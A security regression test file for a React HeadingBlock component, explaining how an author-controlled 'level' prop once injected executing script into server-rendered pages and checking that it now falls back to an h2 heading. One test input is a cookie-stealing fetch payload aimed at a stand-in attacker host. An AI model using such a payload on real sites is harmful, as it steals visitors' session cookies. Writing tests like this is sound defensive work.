import { describe, it, expect } from 'vitest';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { HeadingBlock } from '../blocks';

/**
 * SECURITY REGRESSION — `level` must never choose the element type.
 *
 * HeadingBlock did `const Tag = level as any` and then set dangerouslySetInnerHTML on it. `level`
 * comes from _puck_data, which any holder of `edit_posts` writes via POST /api/v1/posts/:id/meta,
 * and the write-side sanitizer (backend core/sanitize-meta.ts) only sanitizes HTML-bearing and
 * URL-bearing string leaves — a STRUCTURAL prop like this one passes through byte-identical by
 * design. So `level: "script"` rendered an executing <script> into the public page's SERVER HTML
 * (author → any visitor, including the admin), and a void tag like `img` threw during SSR and turned
 * the page into a 500.
 *
 * These render the SHIPPED component through the real server renderer rather than asserting on the
 * source, so the test fails if the guard is removed no matter how it is rewritten.
 */

const render = (props: Record<string, unknown>) =>
    renderToStaticMarkup(React.createElement(HeadingBlock, props));

describe('HeadingBlock element type', () => {
    it('renders each legitimate heading level as itself', () => {
        for (const level of ['h1', 'h2', 'h3', 'h4', 'h5', 'h6']) {
            const html = render({ title: 'Hello', level });
            expect(html).toContain(`<${level} `);
            expect(html).toContain(`heading-${level}`);
        }
    });

    it('never emits a <script>, whatever `level` says', () => {
        const html = render({ title: "fetch('https://evil.example/x?c='+document.cookie)", level: 'script' });
        expect(html).not.toContain('<script');
        expect(html).toContain('<h2 ');            // falls back to a heading
        expect(html).not.toContain('heading-script'); // and the class must not echo it either
    });

    it('does not let an arbitrary tag through', () => {
        for (const level of ['iframe', 'object', 'style', 'svg', 'a', 'H1', 'h7']) {
            const html = render({ title: 'x', level });
            expect(html.startsWith('<h2 ')).toBe(true);
        }
    });

    it('survives a void tag instead of throwing during SSR (the 500 vector)', () => {
        for (const level of ['img', 'br', 'input', 'hr']) {
            expect(() => render({ title: 'x', level })).not.toThrow();
        }
    });

    it('survives a non-string level', () => {
        for (const level of [undefined, null, 2, {}, ['h1']]) {
            expect(() => render({ title: 'x', level })).not.toThrow();
        }
    });
});
